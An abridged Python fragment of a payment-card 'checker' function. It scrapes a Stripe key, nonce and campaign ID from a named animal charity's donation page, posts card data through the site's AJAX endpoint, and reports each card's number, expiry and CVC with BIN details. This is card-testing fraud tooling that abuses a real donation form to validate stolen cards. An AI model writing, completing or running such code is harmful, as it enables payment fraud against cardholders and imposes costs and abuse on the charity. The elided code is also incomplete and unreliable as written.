...
def check_cc():
    ...
    try:
        r1 = session.get("https://freeanimaldoctor.org/donate/?campaign=pepe-4", headers=headers, timeout=10)
        stripe_key = None
        ajax_url = None
        nonce = None
        campaign_id = None
        ...
        r2 = session.post(ajax_url, headers=ajax_headers, data=ajax_data, timeout=10)
        ...
        bin_info = get_bin_info(bin)
        response = {
            "message": f"Declined | {card_number}|{exp_month}|{exp_year}|{cvc} | {str(e)}",
            "status": "error",
            "time": elapsed
        }
        if bin_info:
